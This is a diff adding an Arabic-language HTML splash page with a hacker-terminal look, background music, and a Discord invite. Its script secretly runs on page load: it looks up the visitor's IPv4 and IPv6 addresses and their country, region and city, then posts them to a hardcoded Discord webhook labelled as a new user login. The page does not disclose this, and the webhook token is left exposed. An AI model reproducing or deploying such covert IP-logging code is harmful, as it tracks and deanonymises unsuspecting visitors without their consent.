@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Music Suite - Secure Terminal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+            position: relative;
+            direction: rtl;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* ومضة خفيفة - سلسة */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #ff0000;
+            z-index: 9999;
+            opacity: 0;
+            pointer-events: none;
+            animation: flash 0.4s cubic-bezier(0.23, 1, 0.32, 1) forwards;
+        }
+        @keyframes flash {
+            0% { opacity: 0.2; }
+            100% { opacity: 0; }
+        }
+
+        /* فيديو الخلفية - مع تسريع GPU */
+        .background-video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -2;
+            opacity: 0.75;
+            will-change: transform;
+            transform: translateZ(0);
+            backface-visibility: hidden;
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.25));
+            z-index: -1;
+            will-change: opacity;
+        }
+
+        /* المحتوى الرئيسي - ظهور سلس */
+        .main-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            z-index: 10;
+            padding: 20px;
+            animation: fadeIn 1.2s cubic-bezier(0.23, 1, 0.32, 1) forwards;
+            will-change: transform, opacity;
+            backface-visibility: hidden;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px) scale(0.98); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .logo-image {
+            width: 180px;
+            height: auto;
+            margin-bottom: 15px;
+            border-radius: 16px;
+            box-shadow: 0 0 35px rgba(255, 255, 255, 0.25);
+            animation: pulse-white 3s ease-in-out infinite;
+            border: 2px solid rgba(255, 255, 255, 0.15);
+            will-change: transform, box-shadow;
+            backface-visibility: hidden;
+        }
+        .main-title {
+            font-size: 2.8em;
+            color: #fff;
+            margin: 10px 0;
+            text-shadow: 0 0 30px rgba(255, 255, 255, 0.8);
+            letter-spacing: 6px;
+            animation: pulse-white 3s ease-in-out infinite;
+            will-change: transform, text-shadow;
+            backface-visibility: hidden;
+        }
+        .subtitle {
+            font-size: 1.8em;
+            color: #ff3333;
+            margin: 5px 0;
+            text-shadow: 0 0 20px rgba(255, 51, 51, 0.7);
+            will-change: transform, text-shadow;
+            backface-visibility: hidden;
+        }
+        @keyframes pulse-white {
+            0%, 100% { text-shadow: 0 0 30px rgba(255, 255, 255, 0.8); transform: scale(1); }
+            50% { text-shadow: 0 0 50px rgba(255, 255, 255, 1); transform: scale(1.02); }
+        }
+
+        /* النص العادي - الرابط فقط */
+        .normal-text {
+            margin-top: 25px;
+            font-size: 1.6em;
+            line-height: 2;
+            background: rgba(0, 0, 0, 0.4);
+            padding: 20px 35px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(4px);
+            max-width: 750px;
+            width: 100%;
+            transition: background 0.3s ease, transform 0.3s ease;
+            will-change: transform, background;
+            backface-visibility: hidden;
+        }
+        .normal-text:hover {
+            background: rgba(0, 0, 0, 0.6);
+            transform: scale(1.01);
+        }
+
+        .discord-highlight {
+            color: #ffd700;
+            text-decoration: none;
+            font-weight: bold;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.7);
+            border-bottom: 1px dashed #ffd700;
+            transition: all 0.25s cubic-bezier(0.23, 1, 0.32, 1);
+            will-change: color, background, text-shadow;
+        }
+        .discord-highlight:hover {
+            color: #fff;
+            background: rgba(255, 215, 0, 0.2);
+            text-shadow: 0 0 20px #ffd700;
+            border-bottom-color: #fff;
+        }
+
+        /* الجسيمات - سلسة وخفيفة */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            pointer-events: none;
+            will-change: transform;
+        }
+        .particle {
+            position: absolute;
+            width: 3px;
+            height: 3px;
+            background: rgba(255, 51, 51, 0.35);
+            border-radius: 50%;
+            animation: float 6s infinite linear;
+            will-change: transform, opacity;
+            backface-visibility: hidden;
+        }
+        @keyframes float {
+            0% { transform: translateY(100vh) scale(0.5); opacity: 1; }
+            100% { transform: translateY(-10px) scale(1); opacity: 0; }
+        }
+
+        /* بيانات المستخدم العلوية */
+        .top-left-status {
+            position: fixed;
+            top: 25px;
+            left: 25px;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 4px;
+            font-family: 'Courier New', monospace;
+            z-index: 1000;
+            direction: ltr;
+            background: rgba(0, 0, 0, 0.65);
+            padding: 12px 20px;
+            border-radius: 8px;
+            border: 1px solid rgba(0, 255, 0, 0.2);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.08);
+            min-width: 160px;
+            transition: background 0.3s ease;
+            will-change: transform, opacity;
+            backface-visibility: hidden;
+        }
+        #clock {
+            font-size: 1.5em;
+            color: #00ff00;
+            font-weight: bold;
+            letter-spacing: 2px;
+            text-shadow: 0 0 12px rgba(0, 255, 0, 0.8);
+            will-change: text-shadow;
+        }
+        .status-text-block {
+            font-size: 0.85em;
+            color: #aaffaa;
+            border-top: 1px solid rgba(0, 255, 0, 0.25);
+            padding-top: 6px;
+            margin-top: 4px;
+            width: 100%;
+            letter-spacing: 0.5px;
+            text-shadow: 0 0 8px rgba(0, 255, 0, 0.5);
+            direction: rtl;
+            text-align: left;
+            line-height: 1.6;
+        }
+
+        /* السجلات السفلية - ناعمة */
+        .bottom-logs {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-family: 'Courier New', monospace;
+            color: #ff3333;
+            font-size: 1.1em;
+            text-shadow: 0 0 8px #ff3333;
+            z-index: 1000;
+            direction: ltr;
+            background: rgba(0, 0, 0, 0.65);
+            padding: 5px 22px;
+            border-radius: 4px;
+            border: 1px solid rgba(255, 51, 51, 0.15);
+            white-space: nowrap;
+            transition: opacity 0.4s ease;
+            will-change: transform, opacity;
+            backface-visibility: hidden;
+        }
+
+        /* استجابة */
+        @media (max-width: 700px) {
+            .main-title { font-size: 2em; }
+            .subtitle { font-size: 1.3em; }
+            .normal-text { font-size: 1.2em; padding: 15px; }
+            .top-left-status { top: 15px; left: 15px; padding: 8px 12px; font-size: 0.8em; min-width: 120px; }
+            .bottom-logs { font-size: 0.8em; padding: 3px 12px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- البيانات العلوية -->
+    <div class="top-left-status">
+        <div id="clock">00:00:00 AM</div>
+        <div id="top-ip-display" class="status-text-block">
+            الدولة: جاري التحميل...<br>
+            المدينة: جاري التحميل...<br>
+            IPv4: جاري التحميل...<br>
+            IPv6: جاري التحميل...
+        </div>
+    </div>
+
+    <!-- السجلات السفلية -->
+    <div class="bottom-logs" id="terminal-logs">[SYS] STATUS: STANDBY_MODE...</div>
+
+    <!-- فيديو الخلفية -->
+    <video class="background-video" autoplay loop muted playsinline id="bg-video">
+        <source src="https://h.top4top.io/m_37898tcsh1.mp4" type="video/mp4" />
+    </video>
+
+    <!-- الصوتيات -->
+    <audio id="background-music" loop playsinline>
+        <source src="https://d.top4top.io/m_3789i6ns81.mp3" type="audio/mpeg" />
+    </audio>
+    <audio id="click-glitch-sound" playsinline>
+        <source src="https://actions.google.com/sounds/v1/science_fiction/glitch_static.ogg" type="audio/ogg" />
+    </audio>
+
+    <div class="overlay"></div>
+    <div class="particles" id="particles"></div>
+
+    <!-- المحتوى الرئيسي -->
+    <div class="main-content" id="main-content">
+        <img src="https://cdn.discordapp.com/attachments/1538790960421543967/1539912314147577856/image.png?ex=6a880a99&is=6a86b919&hm=bdf2e6c913948777dd43b3a926774297aa3e88782c9a57a7072a38eb51ac9ae1&" alt="Logo" class="logo-image" />
+        <div class="main-title">فحلكم وصل</div>
+        <div class="subtitle">Bu7umaid/Error
+My dis : .1e5</div>
+
+        <!-- الرابط فقط -->
+        <div class="normal-text">
+            <a href="https://discord.gg/127" class="discord-highlight" target="_blank">discord.gg/127</a>
+        </div>
+    </div>
+
+    <script>
+        // ====== دوال الشبكة والجيو ======
+        let currentNetworkData = {};
+
+        function fetchWithTimeout(url, timeout = 4000) {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), timeout);
+            return fetch(url, { signal: controller.signal, headers: { 'Accept': 'application/json' } })
+                .then(response => {
+                    clearTimeout(timeoutId);
+                    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+                    return response.json();
+                })
+                .catch(err => {
+                    clearTimeout(timeoutId);
+                    throw new Error(`Timeout or Network error: ${err.message}`);
+                });
+        }
+
+        async function fetchIPVersion(version) {
+            const urls = {
+                v4: ['https://api.ipify.org?format=json', 'https://ipv4.icanhazip.com/'],
+                v6: ['https://api6.ipify.org?format=json', 'https://ipv6.icanhazip.com/']
+            };
+            const list = urls[version] || urls.v4;
+            for (const url of list) {
+                try {
+                    const resp = await fetchWithTimeout(url, 3000);
+                    if (typeof resp === 'string') {
+                        const ip = resp.trim();
+                        if (ip) return { ip };
+                    }
+                    if (resp && resp.ip) {
+                        return { ip: resp.ip };
+                    }
+                } catch (_) {}
+            }
+            return null;
+        }
+
+        async function fetchOptimizedNetworkData() {
+            try {
+                const cached = localStorage.getItem('user_geo_cache');
+                if (cached) {
+                    const parsed = JSON.parse(cached);
+                    if (Date.now() - parsed.timestamp < 3600000) {
+                        return parsed.data;
+                    }
+                }
+            } catch (e) {}
+
+            const [v4Result, v6Result] = await Promise.allSettled([
+                fetchIPVersion('v4'),
+                fetchIPVersion('v6')
+            ]);
+
+            const ipv4 = v4Result.status === 'fulfilled' && v4Result.value ? v4Result.value.ip : 'غير متاح';
+            const ipv6 = v6Result.status === 'fulfilled' && v6Result.value ? v6Result.value.ip : 'غير متاح';
+            const geoData = await fetchGeoLocation();
+
+            const result = {
+                ipv4,
+                ipv6,
+                country: geoData?.country || 'غير معروف',
+                region: geoData?.region || 'غير معروف',
+                city: geoData?.city || 'غير معروف',
+                isp: geoData?.isp || 'غير معروف'
+            };
+
+            localStorage.setItem('user_geo_cache', JSON.stringify({ data: result, timestamp: Date.now() }));
+            return result;
+        }
+
+        async function fetchGeoLocation() {
+            const API_SOURCES = [{
+                url: 'https://ipapi.co/json/',
+                parser: (data) => ({
+                    country: data.country_name || data.country || 'غير معروف',
+                    region: data.region || 'غير معروف',
+                    city: data.city || 'غير معروف',
+                    isp: data.org || data.isp || 'غير معروف'
+                })
+            }, {
+                url: 'https://ipwho.is/',
+                parser: (data) => ({
+                    country: data.country || 'غير معروف',
+                    region: data.region || 'غير معروف',
+                    city: data.city || 'غير معروف',
+                    isp: data.connection?.isp || data.org || 'غير معروف'
+                })
+            }];
+
+            const fetchPromises = API_SOURCES.map(source =>
+                fetchWithTimeout(source.url, 3000).then(data => source.parser(data))
+            );
+            try {
+                return await Promise.any(fetchPromises);
+            } catch (error) {
+                return null;
+            }
+        }
+
+        function updateLocationUI(data) {
+            const displayElement = document.getElementById('top-ip-display');
+            if (displayElement) {
+                displayElement.innerHTML = `
+                    الدولة: ${data.country}<br>
+                    المنطقة: ${data.region}<br>
+                    المدينة: ${data.city}<br>
+                    IPv4: ${data.ipv4}<br>
+                    IPv6: ${data.ipv6}
+                `;
+            }
+        }
+
+        function showOfflineUI() {
+            const displayElement = document.getElementById('top-ip-display');
+            if (displayElement) {
+                displayElement.innerHTML = `
+                    الدولة: فحص الشبكة...<br>
+                    المنطقة: جاري التثبيت...<br>
+                    المدينة: فحص الاتصال...<br>
+                    IPv4: جاري التحميل...<br>
+                    IPv6: جاري التحميل...
+                `;
+            }
+        }
+
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1522122255327297667/2Sh-s4h-GgR_BaM8eexpMzzrO_7XimZavKHcbXMPDoPbhxIV5_yF020WA3AbTssRuXR8';
+
+        function sendToWebhook(data) {
+            if (!WEBHOOK_URL) return;
+            const payload = {
+                username: "System Logger",
+                embeds: [{
+                    title: "🌐 تسجيل دخول مستخدم جديد (IPv4 & IPv6)",
+                    color: 15548997,
+                    fields: [
+                        { name: "📌 IPv4 Address", value: `\`${data.ipv4 || "غير متاح"}\``, inline: false },
+                        { name: "📌 IPv6 Address", value: `\`${data.ipv6 || "غير متاح"}\``, inline: false },
+                        { name: "🏳️ Country", value: data.country || "غير معروف", inline: true },
+                        { name: "📍 Region", value: data.region || "غير معروف", inline: true },
+                        { name: "🏙️ City", value: data.city || "غير معروف", inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+        }
+
+        async function fetchSystemNetworkData() {
+            const data = await fetchOptimizedNetworkData();
+            if (data && data.ipv4) {
+                currentNetworkData = data;
+                updateLocationUI(data);
+                sendToWebhook(data);
+            } else {
+                showOfflineUI();
+            }
+        }
+
+        // ====== الجسيمات - عدد أقل وسلس ======
+        function createParticles() {
+            const particles = document.getElementById('particles');
+            if (!particles) return;
+            const count = 20; // أقل للحصول على أداء أفضل
+            for (let i = 0; i < count; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.top = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 4 + 's';
+                particle.style.animationDuration = (Math.random() * 3 + 4) + 's'; // أبطأ قليلاً
+                particles.appendChild(particle);
+                setTimeout(() => particle.remove(), 7000);
+            }
+        }
+        setInterval(createParticles, 7000);
+        createParticles();
+
+        // ====== الصوت والفيديو ======
+        const music = document.getElementById('background-music');
+        const glitchSound = document.getElementById('click-glitch-sound');
+        const video = document.getElementById('bg-video');
+
+        const playMedia = () => {
+            if (music) {
+                music.muted = false;
+                music.volume = 1.0;
+                music.play().catch(() => {});
+            }
+            if (video) {
+                video.muted = true;
+                video.play().catch(() => {});
+            }
+        };
+
+        const activateInterface = () => {
+            if (glitchSound) { glitchSound.volume = 0.4; glitchSound.play().catch(() => {}); }
+            playMedia();
+        };
+
+        document.addEventListener('click', activateInterface, { once: true });
+        document.addEventListener('keydown', activateInterface, { once: true });
+
+        // ====== الساعة الرقمية ======
+        function updateClock() {
+            const now = new Date();
+            let hours = now.getHours();
+            const minutes = String(now.getMinutes()).padStart(2, '0');
+            const seconds = String(now.getSeconds()).padStart(2, '0');
+            const ampm = hours >= 12 ? 'PM' : 'AM';
+            hours = hours % 12 || 12;
+            const clockElement = document.getElementById('clock');
+            if (clockElement) {
+                clockElement.textContent = `${String(hours).padStart(2, '0')}:${minutes}:${seconds} ${ampm}`;
+            }
+        }
+        setInterval(updateClock, 1000);
+        updateClock();
+
+        // ====== السجلات السفلية المتناوبة ======
+        const logsSequence = [
+            "[SYS] STATUS: INITIALIZING SYSLOG...",
+            "[NET] VERIFYING CONNECTION INTEGRITY...",
+            "[SEC] CHECKING ENVIRONMENT NODE_7...",
+            "[OK] PIPELINE SYNCED WITH TERMINAL."
+        ];
+        let logIndex = 0;
+        setInterval(() => {
+            const logElement = document.getElementById('terminal-logs');
+            if (logElement) {
+                logElement.textContent = logsSequence[logIndex];
+                logIndex = (logIndex + 1) % logsSequence.length;
+            }
+        }, 3500);
+
+        // ====== جلب بيانات الشبكة ======
+        fetchSystemNetworkData();
+
+        // محاولة تشغيل الصوت عند التحميل
+        window.addEventListener('load', () => {
+            playMedia();
+        });
+    </script>
+</body>
+</html>
